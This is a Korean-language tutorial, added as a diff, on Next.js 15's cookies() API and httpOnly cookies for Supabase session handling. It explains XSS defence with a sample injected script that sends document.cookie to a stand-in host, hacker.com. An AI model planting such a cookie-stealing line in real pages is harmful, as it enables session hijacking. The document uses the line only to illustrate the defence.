@@ -1,0 +1,282 @@
+ # Next.js 15의 cookies() API와 httpOnly 쿠키 설정
+
+  🍪 cookies() API의 역할
+
+  1. Next.js 15의 cookies() API란?
+
+  Next.js 15에서 제공하는 서버 사이드 쿠키 관리 API입니다.
+
+  import { cookies } from 'next/headers'
+
+  // Server Component, Server Action, Route Handler에서만 사용 가능
+  const cookieStore = await cookies()
+
+  주요 특징:
+  - ✅ 서버에서만 실행 (보안)
+  - ✅ async 함수 (Next.js 15부터 비동기)
+  - ✅ httpOnly 쿠키 접근 가능
+  - ❌ Client Component에서 사용 불가
+
+  2. cookies() API 메서드
+
+  const cookieStore = await cookies()
+
+  // 쿠키 읽기
+  cookieStore.get('name')           // 단일 쿠키
+  cookieStore.getAll()              // 모든 쿠키
+
+  // 쿠키 쓰기
+  cookieStore.set('name', 'value', options)
+
+  // 쿠키 삭제
+  cookieStore.delete('name')
+
+  ---
+  🔐 httpOnly 쿠키란?
+
+  1. httpOnly 쿠키의 개념
+
+  일반 쿠키:
+  // JavaScript로 접근 가능 (위험!)
+  document.cookie = "token=abc123"
+  console.log(document.cookie) // "token=abc123" 출력됨
+
+  httpOnly 쿠키:
+  // JavaScript로 접근 불가 (안전!)
+  console.log(document.cookie) // httpOnly 쿠키는 안 보임
+
+  2. 왜 httpOnly가 중요한가?
+
+  XSS 공격 시나리오:
+  <!-- 악성 스크립트가 주입된 경우 -->
+  <script>
+    // 일반 쿠키: 탈취 가능 😱
+    fetch('https://hacker.com/steal?cookie=' + document.cookie)
+
+    // httpOnly 쿠키: 접근 불가 ✅
+    // document.cookie에 안 보임!
+  </script>
+
+  보안 비교:
+  | 쿠키 타입    | JavaScript 접근 | XSS 공격 시 |
+  |----------|---------------|----------|
+  | 일반 쿠키    | ✅ 가능          | ❌ 탈취됨    |
+  | httpOnly | ❌ 불가          | ✅ 안전     |
+
+  ---
+  🔧 Supabase Server 클라이언트에서의 구현
+
+  1. 전체 코드 구조
+
+  // src/lib/supabase/server.ts
+  import { createServerClient } from '@supabase/ssr'
+  import { cookies } from 'next/headers'
+
+  export async function createClient() {
+    const cookieStore = await cookies()
+
+    return createServerClient(
+      process.env.NEXT_PUBLIC_SUPABASE_URL!,
+      process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
+      {
+        cookies: {
+          // 역할 1: 쿠키 읽기
+          getAll() {
+            return cookieStore.getAll()
+          },
+
+          // 역할 2: 쿠키 쓰기 (httpOnly 포함)
+          setAll(cookiesToSet) {
+            try {
+              cookiesToSet.forEach(({ name, value, options }) =>
+                cookieStore.set(name, value, options)
+              )
+            } catch {
+              // Server Component에서는 쿠키 설정 불가 (읽기 전용)
+              // Server Action, Route Handler에서만 가능
+            }
+          },
+        },
+      }
+    )
+  }
+
+  2. 각 부분의 역할 상세 설명
+
+  A. getAll() - 쿠키 읽기
+
+  getAll() {
+    return cookieStore.getAll()
+  }
+
+  역할:
+  - Supabase 세션 토큰을 쿠키에서 읽기
+  - 사용자 로그인 상태 확인
+  - Server Component에서 데이터 fetch 시 사용
+
+  실제 동작:
+  // Supabase가 내부적으로 이렇게 사용
+  const session = getAll().find(c => c.name === 'sb-access-token')
+
+  B. setAll() - 쿠키 쓰기 (httpOnly 설정)
+
+  setAll(cookiesToSet) {
+    cookiesToSet.forEach(({ name, value, options }) =>
+      cookieStore.set(name, value, options)
+    )
+  }
+
+  역할:
+  - 로그인 시 세션 토큰을 httpOnly 쿠키로 저장
+  - refresh token 갱신
+  - 로그아웃 시 쿠키 삭제
+
+  options 매개변수:
+  {
+    name: 'sb-access-token',
+    value: 'eyJhbGci...',
+    options: {
+      httpOnly: true,      // JavaScript 접근 차단 ✅
+      secure: true,        // HTTPS만 전송
+      sameSite: 'lax',     // CSRF 방어
+      maxAge: 604800,      // 7일
+      path: '/'
+    }
+  }
+
+  3. try-catch의 이유
+
+  try {
+    cookiesToSet.forEach(...)
+  } catch {
+    // Server Component에서는 에러 발생
+  }
+
+  Next.js 15 제약사항:
+  - ✅ Server Action: 쿠키 읽기 + 쓰기 가능
+  - ✅ Route Handler: 쿠키 읽기 + 쓰기 가능
+  - ❌ Server Component: 쿠키 읽기만 가능 (쓰기 불가)
+
+  왜 읽기만?
+  - Server Component는 렌더링만 담당
+  - 부작용(side effect) 금지
+  - 쿠키 쓰기는 Server Action에서만
+
+  ---
+  📋 실제 사용 시나리오
+
+  시나리오 1: 로그인 (쿠키 쓰기)
+
+  // app/actions/auth.ts (Server Action)
+  'use server'
+
+  import { createClient } from '@/lib/supabase/server'
+  import { redirect } from 'next/navigation'
+
+  export async function login(formData: FormData) {
+    const supabase = await createClient()
+
+    // 로그인 시도
+    const { error } = await supabase.auth.signInWithPassword({
+      email: formData.get('email') as string,
+      password: formData.get('password') as string,
+    })
+
+    // 내부적으로 setAll()이 호출되어 httpOnly 쿠키에 저장됨
+    // sb-access-token: { httpOnly: true, secure: true, ... }
+
+    if (error) return { error: error.message }
+
+    redirect('/dashboard')
+  }
+
+  쿠키 저장 흐름:
+  1. signInWithPassword() 호출
+  2. Supabase가 토큰 생성
+  3. setAll() 호출
+  4. cookieStore.set() 실행
+  5. httpOnly 쿠키에 저장 ✅
+
+  시나리오 2: 세션 확인 (쿠키 읽기)
+
+  // app/dashboard/page.tsx (Server Component)
+  import { createClient } from '@/lib/supabase/server'
+  import { redirect } from 'next/navigation'
+
+  export default async function DashboardPage() {
+    const supabase = await createClient()
+
+    // 내부적으로 getAll()이 호출되어 쿠키에서 세션 읽음
+    const { data: { user } } = await supabase.auth.getUser()
+
+    if (!user) {
+      redirect('/login')
+    }
+
+    return <div>Welcome {user.email}</div>
+  }
+
+  쿠키 읽기 흐름:
+  1. getUser() 호출
+  2. getAll() 실행
+  3. sb-access-token 쿠키 찾기
+  4. 토큰 검증
+  5. 사용자 정보 반환
+
+  시나리오 3: 로그아웃 (쿠키 삭제)
+
+  // app/actions/auth.ts
+  'use server'
+
+  export async function logout() {
+    const supabase = await createClient()
+
+    await supabase.auth.signOut()
+    // 내부적으로 setAll()이 호출되어 쿠키 삭제
+
+    redirect('/login')
+  }
+
+  ---
+  🔐 보안 이점 정리
+
+  1. httpOnly 쿠키의 보안
+
+  // ❌ 일반 쿠키 (localStorage 등)
+  localStorage.setItem('token', 'abc123')
+  // XSS 공격 시: 탈취 가능!
+
+  // ✅ httpOnly 쿠키
+  cookieStore.set('token', 'abc123', { httpOnly: true })
+  // XSS 공격 시: document.cookie로 접근 불가!
+
+  2. 추가 보안 옵션
+
+  options: {
+    httpOnly: true,     // XSS 방어
+    secure: true,       // HTTPS만 전송 (중간자 공격 방어)
+    sameSite: 'lax',    // CSRF 방어
+    path: '/',          // 전체 경로에서 접근
+    maxAge: 604800,     // 7일 후 자동 삭제
+  }
+
+  ---
+  📌 정리
+
+  cookies() API의 역할:
+  1. ✅ 서버에서 쿠키 읽기/쓰기
+  2. ✅ httpOnly 쿠키 관리
+  3. ✅ Next.js 15 App Router와 통합
+
+  httpOnly 쿠키의 역할:
+  1. ✅ JavaScript 접근 차단 → XSS 방어
+  2. ✅ HTTPS만 전송 → 중간자 공격 방어
+  3. ✅ SameSite → CSRF 방어
+
+  구현 방법:
+  1. cookies() API로 쿠키 스토어 가져오기
+  2. getAll()로 읽기
+  3. setAll()로 쓰기 (httpOnly 자동 설정)
+  4. Server Action에서만 쿠키 쓰기 가능
+
+  이렇게 하면 Supabase 세션이 안전하게 httpOnly 쿠키로 관리됩니다! 🔒
